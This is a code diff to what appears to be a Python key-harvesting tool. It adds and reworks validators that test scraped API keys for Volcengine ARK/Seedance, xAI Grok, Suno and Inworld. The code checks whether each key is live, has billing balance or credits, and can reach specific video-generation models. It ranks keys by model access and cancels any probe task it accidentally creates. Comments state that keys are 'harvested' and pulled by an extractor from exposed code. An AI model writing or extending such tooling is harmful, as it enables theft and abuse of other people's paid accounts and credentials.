@@ -358,69 +358,99 @@ async def _ark_cancel_task(region: str, key: str, task_id: str):
         pass
 
 
+# Billing error codes that mean the account CAN authenticate but CANNOT generate.
+# Defined at module level so both ark/ark_fast validators can reference it.
+_ARK_BILLING_DEAD = frozenset({
+    "AccountOverdueError", "InsufficientBalance", "AccountBalanceNotEnough",
+    "ChargeNotEnoughError", "ResourceInsufficient",
+})
+
+_ARK_MODEL_DEAD = frozenset({"ModelNotOpen", "InvalidEndpointOrModel.NotFound", "EndpointNotFound"})
+
+
+async def _ark_auth_check(region: str, key: str) -> str:
+    """
+    Step 1 for both ark validators: cheap Doubao chat auth pre-check.
+    Returns: 'dead' | 'billing_dead' | 'ok' | 'unreachable'
+    """
+    status, body = await _ark_post(f"{region}/api/v3/chat/completions", key, {
+        "model":      _ARK_DOUBAO_CHAT,
+        "messages":   [{"role": "user", "content": "hi"}],
+        "max_tokens": 1,
+    })
+    if status == 0:
+        return "unreachable"
+    code = _ark_err_code(body)
+    if status == 401 or code in ("AuthenticationFailed", "InvalidApiKey", "Unauthorized"):
+        return "dead"
+    if code in _ARK_BILLING_DEAD:
+        return "billing_dead"
+    return "ok"
+
+
+async def validate_ark_fast(key: str) -> bool:
+    """
+    True only if ARK key can access Seedance 2.0-fast model
+    (doubao-seedance-2-0-fast-260128). Keys with only 2.0-standard or 1.x → False.
+    Registered BEFORE validate_ark in VALIDATORS so that dual-capable keys
+    are saved as ark_fast (higher priority) — hash uniqueness prevents dupe saves.
+    """
+    for region in _ARK_REGIONS:
+        auth = await _ark_auth_check(region, key)
+        if auth == "unreachable":
+            continue
+        if auth in ("dead", "billing_dead"):
+            return False
+        s, b = await _ark_post(f"{region}/api/v3/contents/generations/tasks", key, {
+            "model":   "doubao-seedance-2-0-fast-260128",
+            "content": [],
+        })
+        if s == 200:
+            task_id = (b.get("id") or "").strip()
+            if task_id:
+                await _ark_cancel_task(region, key, task_id)
+            return True
+        if s == 429:
+            return True
+        c = _ark_err_code(b)
+        if c in _ARK_MODEL_DEAD:
+            return False  # 2.0-fast not activated on this account
+        if 400 <= s < 500:
+            return True   # param-level error = model activated
+        return False
+    return False
+
+
 async def validate_ark(key: str) -> bool:
     """
-    True only if ARK key auth-passes AND has at least one Seedance video
-    model activated. Chat-only or zero-models accounts → invalid: we harvest
-    specifically for the seedance video pipeline, a Doubao-text-only key
-    is useless to us.
-
-    Detects:
-      - 401 / AuthenticationFailed → dead key
-      - 403 AccountOverdueError / InsufficientBalance → account in arrears (useless)
-      - ModelNotOpen on every Seedance model → no video access
-      - InvalidEndpointOrModel.NotFound on every probe → no Seedance available
-      - 200 / 429 / param-level 4xx on any Seedance model → valid
+    True only if ARK key can access Seedance 2.0-standard model
+    (doubao-seedance-2-0-260128). Keys with only 1.x → False.
+    Note: 2.0-fast keys are captured by validate_ark_fast (runs first);
+    this handles keys that have 2.0-standard but not 2.0-fast.
     """
-    # Billing error codes: account authenticated but cannot generate (overdue/no balance)
-    _BILLING_DEAD = frozenset({
-        "AccountOverdueError", "InsufficientBalance", "AccountBalanceNotEnough",
-        "ChargeNotEnoughError", "ResourceInsufficient",
-    })
-
     for region in _ARK_REGIONS:
-        # Step 1: auth pre-check via cheap Doubao chat (~$0.0000005).
-        status, body = await _ark_post(f"{region}/api/v3/chat/completions", key, {
-            "model":      _ARK_DOUBAO_CHAT,
-            "messages":   [{"role": "user", "content": "hi"}],
-            "max_tokens": 1,
+        auth = await _ark_auth_check(region, key)
+        if auth == "unreachable":
+            continue
+        if auth in ("dead", "billing_dead"):
+            return False
+        s, b = await _ark_post(f"{region}/api/v3/contents/generations/tasks", key, {
+            "model":   "doubao-seedance-2-0-260128",
+            "content": [],
         })
-        if status == 0:
-            continue  # network issue — try next region
-        code = _ark_err_code(body)
-        if status == 401 or code in ("AuthenticationFailed", "InvalidApiKey", "Unauthorized"):
-            return False  # dead key — no point trying other regions
-        if code in _BILLING_DEAD:
-            return False  # account overdue / no balance — can't generate anything
-
-        # Step 2: probe Seedance models via task endpoint with empty content.
-        # Volcengine validates auth → model permission → params in that order,
-        # so an activated model gives a param-level 4xx (no billing) and a
-        # non-activated model gives ModelNotOpen / NotFound.
-        tasks_url = f"{region}/api/v3/contents/generations/tasks"
-        for model in _ARK_SEEDANCE_MODELS:
-            s, b = await _ark_post(tasks_url, key, {
-                "model":   model,
-                "content": [],
-            })
-            if s == 200:
-                # Task accidentally created (check order may differ from docs) — cancel
-                task_id = (b.get("id") or "").strip()
-                if task_id:
-                    await _ark_cancel_task(region, key, task_id)
-                return True
-            if s == 429:
-                return True  # rate-limited but auth + model OK
-            c = _ark_err_code(b)
-            if c in ("ModelNotOpen", "InvalidEndpointOrModel.NotFound"):
-                continue   # try next Seedance model
-            if 400 <= s < 500:
-                return True  # param-level 4xx → model activated, just bad request
-
-        # Auth passed in this region but every Seedance model is dead → useless key
+        if s == 200:
+            task_id = (b.get("id") or "").strip()
+            if task_id:
+                await _ark_cancel_task(region, key, task_id)
+            return True
+        if s == 429:
+            return True
+        c = _ark_err_code(b)
+        if c in _ARK_MODEL_DEAD:
+            return False  # 2.0-standard not activated
+        if 400 <= s < 500:
+            return True
         return False
-
-    # All regions unreachable
     return False
 
 
@@ -437,6 +467,88 @@ async def validate_happyhorse(key: str) -> bool:
         return False
 
 
+async def validate_grok(key: str) -> bool:
+    """
+    xAI Grok — GET /v1/models: 200 = live key, 401 = dead.
+    xAI gives $25 free credit monthly so most non-revoked keys have quota.
+    """
+    try:
+        async with _client() as c:
+            r = await c.get(
+                "https://api.x.ai/v1/models",
+                headers={"Authorization": f"Bearer {key}"},
+            )
+        if r.status_code == 200:
+            return True
+        if r.status_code in (401, 403):
+            return False
+        return r.status_code == 429
+    except Exception as e:
+        log.debug("grok validate err: %s", e)
+        return False
+
+
+async def validate_suno(key: str) -> bool:
+    """
+    Suno AI music generation — GET /api/get_limit checks credits.
+    Uses the community API wrapper at api.sunoapi.org (mirrors official Suno API).
+    401 = invalid key, 200 with credits_left=0 = exhausted, otherwise valid.
+    """
+    try:
+        async with _client() as c:
+            r = await c.get(
+                "https://api.sunoapi.org/api/get_limit",
+                headers={"Authorization": f"Bearer {key}"},
+            )
+        if r.status_code == 401:
+            return False
+        if r.status_code == 429:
+            return True
+        if r.status_code == 200:
+            try:
+                body = r.json() or {}
+                credits = body.get("credits_left", body.get("remaining", -1))
+                if credits == 0:
+                    return False
+            except Exception:
+                pass
+            return True
+        return False
+    except Exception as e:
+        log.debug("suno validate err: %s", e)
+        return False
+
+
+async def validate_inworld(key: str) -> bool:
+    """
+    Inworld AI TTS — the key is a base64-encoded 'api_key:api_secret' pair.
+    Extractor stores the pre-encoded base64 string found near INWORLD_BASE64 /
+    INWORLD_AUTH context; validator just checks Basic auth against the studio API.
+    """
+    try:
+        import base64
+        # Validate it decodes to something that looks like key:secret
+        try:
+            decoded = base64.b64decode(key + "==").decode("utf-8", errors="replace")
+            if ":" not in decoded:
+                return False
+        except Exception:
+            return False
+        async with _client() as c:
+            r = await c.get(
+                "https://api.inworld.ai/v1/workspaces",
+                headers={"Authorization": f"Basic {key}"},
+            )
+        if r.status_code == 200:
+            return True
+        if r.status_code in (401, 403):
+            return False
+        return r.status_code == 429
+    except Exception as e:
+        log.debug("inworld validate err: %s", e)
+        return False
+
+
 VALIDATORS: dict[str, callable] = {
     "openai":       validate_openai,
     "openai_image": validate_openai_image,
@@ -444,8 +556,12 @@ VALIDATORS: dict[str, callable] = {
     "google":       validate_google,
     "deepseek":     validate_deepseek,
     "elevenlabs":   validate_elevenlabs,
-    "ark":          validate_ark,
+    "ark_fast":     validate_ark_fast,   # Seedance 2.0-fast — registered BEFORE ark
+    "ark":          validate_ark,        # Seedance 2.0-standard
     "happyhorse":   validate_happyhorse,
+    "grok":         validate_grok,
+    "suno":         validate_suno,
+    "inworld":      validate_inworld,
 }
 
 
